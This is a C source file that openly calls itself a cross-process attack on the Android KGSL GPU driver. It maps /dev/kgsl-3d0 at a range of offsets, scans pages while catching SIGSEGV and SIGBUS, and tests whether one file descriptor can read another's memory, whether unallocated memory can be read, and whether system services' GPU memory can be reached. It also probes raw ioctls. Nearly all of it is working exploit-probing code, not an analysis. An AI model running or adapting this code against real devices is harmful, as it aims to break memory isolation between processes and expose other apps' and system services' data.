/*
 * kgsl_cross_process_attack.c - cross-process GPU memory attack
 *
 * Confirmed:
 * - multiple fds in the same process share the GPU memory table
 * - offset=0x1000 corresponds to page 0
 * - offset=0x2000 corresponds to page 1
 *
 * Next, test:
 * 1. Whether unallocated GPU pages can be read
 * 2. Whether GPU memory can be accessed across processes
 * 3. Whether system services' GPU memory can be accessed
 *
 * Build:
 * aarch64-linux-android31-clang -static -O2 -o kgsl_cross_process_attack kgsl_cross_process_attack.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <stdint.h>
#include <signal.h>
#include <setjmp.h>

#define IOCTL_GPUMEM_ALLOC 0xc018092f

static sigjmp_buf jmp_env;
static volatile int sig_received = 0;

void sig_handler(int sig)
{
    sig_received = sig;
    siglongjmp(jmp_env, 1);
}

int safe_read(void *ptr, uint64_t *out)
{
    sig_received = 0;
    if (sigsetjmp(jmp_env, 1) == 0)
    {
        *out = *(volatile uint64_t *)ptr;
        return 0;
    }
    return -1;
}

/*
 * Scan a wide offset range to see whether any region is accessible
 * This may find GPU memory allocated by other processes
 */
void scan_gpu_memory_range()
{
    printf("\n=== Scanning GPU Memory Range ===\n");

    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0)
    {
        printf("[-] Cannot open KGSL\n");
        return;
    }

    signal(SIGSEGV, sig_handler);
    signal(SIGBUS, sig_handler);

    int accessible = 0;
    int non_zero = 0;

    // Scan a wide range
    // 0x1000 = page 0
    // 0x100000 = page 255
    // 0x1000000 = page 4095

    printf("[*] Scanning offset 0x1000 to 0x100000 (256 pages)...\n");

    for (uint64_t offset = 0x1000; offset <= 0x100000; offset += 0x1000)
    {
        void *ptr = mmap(NULL, 0x1000, PROT_READ,
                         MAP_SHARED, fd, offset);

        if (ptr != MAP_FAILED)
        {
            accessible++;

            uint64_t val;
            if (safe_read(ptr, &val) == 0 && val != 0)
            {
                non_zero++;

                // Only show the first few interesting ones
                if (non_zero <= 10)
                {
                    printf("    [+] offset=0x%lx: 0x%lx\n", offset, val);
                }
            }

            munmap(ptr, 0x1000);
        }
    }

    printf("[*] Accessible pages: %d\n", accessible);
    printf("[*] Non-zero pages: %d\n", non_zero);

    close(fd);
}

/*
 * Allocate nothing and try to access offset=0x1000
 * If it succeeds, it may be accessing another process's GPU memory
 */
void test_unallocated_access()
{
    printf("\n=== Testing Unallocated GPU Memory Access ===\n");

    // Open a new fd without any allocation
    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0)
    {
        printf("[-] Cannot open KGSL\n");
        return;
    }

    signal(SIGSEGV, sig_handler);
    signal(SIGBUS, sig_handler);

    // Try to access offset=0x1000 (no allocation)
    void *ptr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                     MAP_SHARED, fd, 0x1000);

    if (ptr == MAP_FAILED)
    {
        printf("[-] mmap failed without allocation: %s\n", strerror(errno));
        close(fd);
        return;
    }

    printf("[+] mmap succeeded without allocation!\n");

    uint64_t val;
    if (safe_read(ptr, &val) == 0)
    {
        printf("[+] Read succeeded: 0x%lx\n", val);

        if (val != 0)
        {
            printf("[!!!] NON-ZERO data from unallocated region!\n");
            printf("[!!!] This could be another process's GPU memory!\n");
        }
    }
    else
    {
        printf("[-] Read failed (signal %d)\n", sig_received);
    }

    munmap(ptr, 0x1000);
    close(fd);
}

/*
 * Test a large range of offsets to see what can be accessed
 */
void probe_all_accessible_memory()
{
    printf("\n=== Probing All Accessible GPU Memory ===\n");

    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0)
        return;

    signal(SIGSEGV, sig_handler);
    signal(SIGBUS, sig_handler);

    // First allocate one to confirm our range
    struct
    {
        uint64_t gpuaddr;
        uint64_t size;
        uint32_t flags;
        uint32_t padding;
    } req = {0};

    req.size = 0x1000;
    ioctl(fd, IOCTL_GPUMEM_ALLOC, &req);
    uint64_t our_gpuaddr = req.gpuaddr;
    printf("[*] Our allocation: 0x%lx\n", our_gpuaddr);

    // Try to access pages before our allocation
    printf("\n[*] Trying to access pages before our allocation:\n");

    for (uint64_t offset = 0x1000; offset <= 0x10000; offset += 0x1000)
    {
        void *ptr = mmap(NULL, 0x1000, PROT_READ,
                         MAP_SHARED, fd, offset);

        if (ptr != MAP_FAILED)
        {
            uint64_t val;
            int read_ok = safe_read(ptr, &val) == 0;

            printf("    offset=0x%lx: mmap=OK, read=%s",
                   offset, read_ok ? "OK" : "FAIL");

            if (read_ok && val != 0)
            {
                printf(", value=0x%lx", val);
            }
            printf("\n");

            munmap(ptr, 0x1000);
        }
        else
        {
            printf("    offset=0x%lx: mmap=FAIL (%s)\n",
                   offset, strerror(errno));
        }
    }

    close(fd);
}

/*
 * Test whether creating multiple fds extends the accessible range
 */
void test_multi_fd_extend()
{
    printf("\n=== Testing Multi-FD Access Extension ===\n");

    // fd1 allocates the first block
    int fd1 = open("/dev/kgsl-3d0", O_RDWR);
    if (fd1 < 0)
        return;

    struct
    {
        uint64_t gpuaddr;
        uint64_t size;
        uint32_t flags;
        uint32_t padding;
    } req = {0};

    req.size = 0x1000;
    ioctl(fd1, IOCTL_GPUMEM_ALLOC, &req);
    uint64_t fd1_addr = req.gpuaddr;
    printf("[*] fd1 allocated: 0x%lx\n", fd1_addr);

    // Write into fd1's allocation
    void *ptr1 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                      MAP_SHARED, fd1, fd1_addr);
    if (ptr1 != MAP_FAILED)
    {
        *(volatile uint64_t *)ptr1 = 0x1111111111111111ULL;
    }

    // fd2 allocates a new block
    int fd2 = open("/dev/kgsl-3d0", O_RDWR);
    if (fd2 < 0)
    {
        munmap(ptr1, 0x1000);
        close(fd1);
        return;
    }

    req.gpuaddr = 0;
    ioctl(fd2, IOCTL_GPUMEM_ALLOC, &req);
    uint64_t fd2_addr = req.gpuaddr;
    printf("[*] fd2 allocated: 0x%lx\n", fd2_addr);

    // Write into fd2's allocation
    void *ptr2 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                      MAP_SHARED, fd2, fd2_addr);
    if (ptr2 != MAP_FAILED)
    {
        *(volatile uint64_t *)ptr2 = 0x2222222222222222ULL;
    }

    signal(SIGSEGV, sig_handler);
    signal(SIGBUS, sig_handler);

    // Test: can fd1 access fd2's block?
    printf("\n[*] Testing fd1 access to fd2's memory:\n");

    // Compute the offset of fd2's block
    uint64_t fd2_page = (fd2_addr - 0x4000000000ULL) / 0x1000;
    uint64_t fd2_offset = (fd2_page + 1) * 0x1000;

    void *cross_ptr = mmap(NULL, 0x1000, PROT_READ,
                           MAP_SHARED, fd1, fd2_offset);

    if (cross_ptr != MAP_FAILED)
    {
        uint64_t val;
        if (safe_read(cross_ptr, &val) == 0)
        {
            printf("    fd1 can read fd2's offset 0x%lx: 0x%lx\n",
                   fd2_offset, val);

            if (val == 0x2222222222222222ULL)
            {
                printf("    [!!!] CONFIRMED: fd1 accessed fd2's GPU memory!\n");
            }
        }
        munmap(cross_ptr, 0x1000);
    }

    // Clean up
    if (ptr1 != MAP_FAILED)
        munmap(ptr1, 0x1000);
    if (ptr2 != MAP_FAILED)
        munmap(ptr2, 0x1000);
    close(fd1);
    close(fd2);
}

/*
 * Try to use GPU_AUX_COMMAND to operate on the shared memory
 */
void test_gpu_command_on_shared()
{
    printf("\n=== Testing GPU Command on Shared Memory ===\n");

    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0)
        return;

    // Allocate GPU memory
    struct
    {
        uint64_t gpuaddr;
        uint64_t size;
        uint32_t flags;
        uint32_t padding;
    } alloc_req = {0};

    alloc_req.size = 0x10000; // 64KB

    if (ioctl(fd, IOCTL_GPUMEM_ALLOC, &alloc_req) < 0)
    {
        printf("[-] Alloc failed\n");
        close(fd);
        return;
    }

    printf("[+] Allocated: gpuaddr=0x%lx\n", alloc_req.gpuaddr);

    // Prepare the GPU command
    // ioctl 0x58 = GPU_AUX_COMMAND
    struct
    {
        uint32_t cmdsize;
        uint32_t flags;
    } aux_cmd = {0};

    aux_cmd.cmdsize = 1;

    int ret = ioctl(fd, 0xc0200958, &aux_cmd);
    printf("[*] GPU_AUX_COMMAND result: %d (errno=%d)\n", ret, errno);

    close(fd);
}

/*
 * Try to exploit SYNCSOURCE_CREATE_FENCE (0x56)
 */
void test_syncsource_fence()
{
    printf("\n=== Testing SYNCSOURCE_CREATE_FENCE ===\n");

    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0)
        return;

    // The structure may be:
    // { uint32_t id; int fence_fd; }

    struct
    {
        uint32_t id;
        int fence_fd;
    } req = {0};

    int ret = ioctl(fd, 0xc0040956, &req);

    printf("[*] Result: ret=%d, errno=%d\n", ret, errno);
    printf("[*] id=%u, fence_fd=%d\n", req.id, req.fence_fd);

    if (ret == 0 && req.fence_fd >= 0)
    {
        printf("[+] Got fence fd! This could be used for signaling.\n");
        close(req.fence_fd);
    }

    close(fd);
}

int main()
{
    printf("=== KGSL Cross-Process Attack ===\n");
    printf("=================================\n");

    // Test access to unallocated memory
    test_unallocated_access();

    // Probe all accessible memory
    probe_all_accessible_memory();

    // Test multi-fd extension
    test_multi_fd_extend();

    // Scan the GPU memory range
    scan_gpu_memory_range();

    // Test syncsource fence
    test_syncsource_fence();

    // Test the GPU command
    test_gpu_command_on_shared();

    return 0;
}
